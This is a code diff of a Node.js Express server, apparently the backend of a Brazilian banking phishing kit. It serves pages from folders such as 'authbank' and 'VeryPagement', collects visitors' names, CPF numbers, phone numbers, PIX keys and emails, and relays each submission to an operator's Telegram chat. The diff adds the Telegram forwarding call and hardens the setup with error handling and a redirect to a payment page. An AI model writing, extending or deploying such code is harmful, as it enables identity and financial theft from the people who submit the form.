@@ -9,6 +9,14 @@ const TelegramBot = require('node-telegram-bot-api');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Validação de variáveis de ambiente
+const requiredEnvVars = ['TELEGRAM_TOKEN', 'EMAIL_USER', 'EMAIL_PASS'];
+for (const envVar of requiredEnvVars) {
+  if (!process.env[envVar]) {
+    console.error(`Erro: Variável de ambiente ${envVar} não está definida.`);
+    process.exit(1);
+  }
+}
 
 // Página inicial
 app.get('/', (req, res) => {
@@ -44,10 +52,6 @@ app.get('/very', (req, res) => {
   res.sendFile(path.join(__dirname, 'very', 'index.html'));
 });
 
-app.get('/VeryPagement', (req, res) => {
-  res.sendFile(path.join(__dirname, 'VeryPagement', 'pagamento.html'));
-});
-
 // Arquivos estáticos
 app.use('/acesso', express.static(path.join(__dirname, 'acesso')));
 app.use('/authbank', express.static(path.join(__dirname, 'authbank')));
@@ -57,20 +61,31 @@ app.use('/pay', express.static(path.join(__dirname, 'pay')));
 app.use('/payvery', express.static(path.join(__dirname, 'payvery')));
 app.use('/very', express.static(path.join(__dirname, 'very')));
 app.use('/VeryPagement', express.static(path.join(__dirname, 'VeryPagement')));
-app.use('/img', express.static(path.join(__dirname, 'img'))); 
+app.use('/img', express.static(path.join(__dirname, 'img')));
+app.use('/inicial', express.static(path.join(__dirname, 'inicial')));
 
 // Telegram Bot
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const ADMINS = process.env.ADMINS?.split(',').map(id => parseInt(id.trim())) || [];
 let CHAT_ID = null;
-const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
-bot.on('message', (msg) => {
-  if (ADMINS.length === 0 || ADMINS.includes(msg.chat.id)) {
-    CHAT_ID = msg.chat.id;
-    console.log(`Chat ID autorizado atualizado: ${CHAT_ID}`);
-  }
-});
+let bot;
+try {
+  bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
+
+  bot.on('message', (msg) => {
+    if (ADMINS.length === 0 || ADMINS.includes(msg.chat.id)) {
+      CHAT_ID = msg.chat.id;
+      console.log(`Chat ID autorizado atualizado: ${CHAT_ID}`);
+    }
+  });
+
+  bot.on('polling_error', (error) => {
+    console.error('Erro no polling do Telegram:', error.message);
+  });
+} catch (error) {
+  console.error('Erro ao inicializar o Telegram Bot:', error.message);
+}
 
 // Middleware
 app.use(cors());
@@ -101,8 +116,8 @@ const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
     user: process.env.EMAIL_USER,
-    pass: process.env.EMAIL_PASS
-  }
+    pass: process.env.EMAIL_PASS,
+  },
 });
 
 // Enviar e-mail
@@ -139,8 +154,6 @@ async function sendConfirmationEmail(cliente, emailDestino) {
   }
 }
 
-
-
 // Rota para cadastro
 app.post('/api/clients', (req, res) => {
   const { nome, cpf, telefone, pix_key_type, pix_key, email } = req.body;
@@ -171,13 +184,13 @@ app.post('/api/clients', (req, res) => {
       pix_key_type,
       pix_key,
       status: 'pendente',
-      data_cadastro: new Date().toISOString()
+      data_cadastro: new Date().toISOString(),
     };
 
     // Enviar e-mail de confirmação
     sendConfirmationEmail(cliente, email);
 
-    // Enviar para o Telegram (certificando-se de que o CHAT_ID está correto)
+    // Enviar para o Telegram
     if (CHAT_ID) {
       const msg = `✨ *Novo Cadastro Recebido!* ✨
 
@@ -191,12 +204,15 @@ app.post('/api/clients', (req, res) => {
 
 📅 *Data/Hora:* _${new Date().toLocaleString()}_`;
 
+      bot.sendMessage(CHAT_ID, msg, { parse_mode: 'Markdown' }).catch((error) => {
+        console.error('Erro ao enviar mensagem para o Telegram:', error.message);
+      });
     } else {
       console.warn('CHAT_ID não foi encontrado. Verifique se um administrador interagiu com o bot.');
     }
 
-    // Redirecionar para a página de pagamento
-    res.redirect('/VeryPagement/pagamento.html');
+    // Retornar sucesso (frontend deve redirecionar)
+    res.status(201).json({ message: 'Cliente cadastrado com sucesso', redirect: '/VeryPagement/pagamento.html' });
   });
 });
 
@@ -211,12 +227,11 @@ app.get('/api/clients', (req, res) => {
   });
 });
 
-app.get('/VeryPagement/pagamento.html', (req, res) => {
-  res.sendFile(path.join(__dirname, 'VeryPagement', 'pagamento.html'));
-});
-
-// Fallback para frontend
+// Fallback para frontend (apenas para rotas não-API)
 app.get('*', (req, res) => {
+  if (req.path.startsWith('/api')) {
+    return res.status(404).json({ error: 'Rota API não encontrada' });
+  }
   res.sendFile(path.join(__dirname, 'authbank', 'index.html'));
 });
 
@@ -227,7 +242,16 @@ app.listen(PORT, () => {
 
 // Fechar conexões
 process.on('SIGINT', () => {
-  db.close();
-  if (bot) bot.stopPolling();
+  console.log('Encerrando servidor...');
+  db.close((err) => {
+    if (err) console.error('Erro ao fechar o banco de dados:', err);
+    else console.log('Banco de dados fechado.');
+  });
+  if (bot) {
+    bot.stopPolling();
+    console.log('Polling do Telegram encerrado.');
+  }
+  transporter.close();
+  console.log('Conexão do Nodemailer encerrada.');
   process.exit();
 });
